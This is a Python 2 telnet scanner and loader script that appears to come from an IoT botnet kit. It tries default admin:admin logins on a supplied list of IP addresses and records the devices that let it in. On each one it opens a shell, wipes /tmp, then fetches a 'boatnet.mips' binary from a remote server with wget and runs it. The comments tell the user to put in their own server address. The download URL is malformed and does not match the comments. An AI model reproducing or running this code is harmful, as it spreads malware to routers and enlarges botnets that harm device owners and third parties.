#!/usr/bin/python

import threading
import sys
import os
import re
import time
import socket
import select
from Queue import *
from sys import stdout

p1 = "wget http://boatnet.mips18.237.72.185/bins/boatnet.mips" # Change '161.35.134.217' To Net IP & 'jKira.mips' to your mips, example: jKira.mips
p2 = "busybox wget http://boatnet.mips18.237.72.185/bins/boatnet.mips" # Change '161.35.134.217' To Net IP & 'jKira.mips' to your mips, example: jKira.mips
p3 = "/bin/busybox wget http://boatnet.mips18.237.72.185/bins/boatnet.mips" # Change '161.35.134.217' To Net IP & 'jKira.mips' to your mips, example: jKira.mips
p4 = "chmod 777 boatnet.mips; ./boatnet.mips DigitalSociopath.xDSL.[LOCKED]" # Change Accordingly

if len(sys.argv) < 4:
    print "Usage: python "+sys.argv[0]+" <list> <threads> <output file>"
    sys.exit()

combo = [ 
    "admin:admin",
]

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

for ip in ips:
    queue_count += 1
    stdout.write("\r[%d] Added to queue" % queue_count)
    stdout.flush()
    queue.put(ip)
print "\n"

def readUntil(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.1)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

def recvTimeout(sock, size, timeout=8):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        data = sock.recv(size)
        return data
    return ""

class vbrxmr(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
    def run(self):
        global fh
        global p1
        global p2
        global p3
        global p4
        username = ""
        password = ""
        for passwd in combo:
            if ":n/a" in passwd:
                password=""
            else:
                password=passwd.split(":")[1]
            if "n/a:" in passwd:
                username=""
            else:
                username=passwd.split(":")[0]
            try:
                tn = socket.socket()
                tn.settimeout(1)
                tn.connect((self.ip,23))
            except Exception:
                tn.close()
                break
            try:
                XDSL_BCM = ''
                XDSL_BCM += readUntil(tn, ":")
                if ":" in XDSL_BCM:
                    tn.send(username + "\n")
                    time.sleep(0.09)
            except Exception:
                tn.close()
            try:
                XDSL_BCM = ''
                XDSL_BCM += readUntil(tn, ":")
                if ":" in XDSL_BCM:
                    tn.send(password + "\n")
                    time.sleep(0.8)
                else:
                    pass
            except Exception:
                tn.close()
            try:
                prompt = ''
                prompt += tn.recv(40960)
                if ">" in prompt and "ONT" not in prompt:
                    success = True
                elif "#" in prompt or "$" in prompt or "root@" in prompt or ">" in prompt:
                    success = True              
                else:
                    tn.close()
                if success == True:
                    try:
                        print "[XDSL_BCM] LOGIN FOUND - %s [%s:%s]"%(self.ip, username, password)
                        fh.write(self.ip + ":23 " + username + ":" + password + "\n")
                        fh.flush()
                        tn.send("sh\r\n")
                        time.sleep(0.1)
                        tn.send("shell\r\n")
                        time.sleep(0.1)
                        tn.send("ls /\r\n")
                        time.sleep(1)
                        timeout = 8
                        buf = ''
                        start_time = time.time()
                        while time.time() - start_time < timeout:
                            buf += recvTimeout(tn, 40960)
                            time.sleep(0.1)
                            if "tmp" in buf and "unrecognized" not in buf:
                            	tn.send("sh\n")
                            	time.sleep(1)
                            	tn.send("cd /tmp\n")
                            	tn.send("rm -rf *\n")
                                tn.send(p1 + "\n")
                                tn.send(p2 + "\n")
                                tn.send(p3 + "\n")
                                tn.send(p4 + "\n")
                                print "[XDSL_BCM] INFECTED - %s [%s:%s]"%(self.ip, username, password)
                                f = open("xdsl_bcm.txt", "a")
                                f.write(self.ip + ":23 " + username + ":" + password + "\n")
                                f.close()
                                time.sleep(10)
                                tn.close()
                                break
                        tn.close()
                        break
                    except:
                        tn.close()
                else:
                    tn.close()
            except Exception:
                tn.close()

def worker():
    try:
        while True:
            try:
                IP = queue.get()
                thread = vbrxmr(IP)
                thread.start()
                queue.task_done()
                time.sleep(0.02)
            except:
                pass
    except:
        pass

global fh
fh = open(output_file, "a")
global active
active = 0

for l in xrange(threads):
    try:
        t = threading.Thread(target=worker)
        t.start()
    except:
        pass

raw_input()
os.kill(os.getpid(), 9)

